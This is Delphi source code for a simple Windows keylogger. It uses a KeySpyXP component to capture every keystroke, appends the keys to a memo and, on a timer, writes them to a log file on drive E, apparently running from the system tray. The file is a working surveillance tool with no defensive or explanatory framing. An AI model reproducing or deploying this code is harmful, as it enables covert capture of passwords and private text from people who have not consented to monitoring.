unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, KeySpyXP, registry, CoolTrayIcon, ExtCtrls;

type
  TForm1 = class(TForm)
    KeySpyXP1: TKeySpyXP;
    Memo1: TMemo;
    ScrollBar1: TScrollBar;
    CoolTrayIcon1: TCoolTrayIcon;
    SaveDialog1: TSaveDialog;
    Timer1: TTimer;
    OpenDialog1: TOpenDialog;
    procedure KeySpyXP1Key(Sender: TObject; key: String);
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);

  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;


implementation

{$R *.dfm}

procedure TForm1.KeySpyXP1Key(Sender: TObject; key: String);
begin
if key[1]='{' then
memo1.lines.add(key) else
memo1.Text:=memo1.text+key;
end;




procedure TForm1.Timer1Timer(Sender: TObject);
begin
memo1.lines.savetofile('E:\plik.txt');

end;

procedure TForm1.FormCreate(Sender: TObject);
begin
if Not FileExists('E:\Plik.txt') Then
begin
memo1.lines.savetofile('E:\plik.txt');
end;




Memo1.Lines.LoadFromFile('E:\plik.txt')
end;

end.
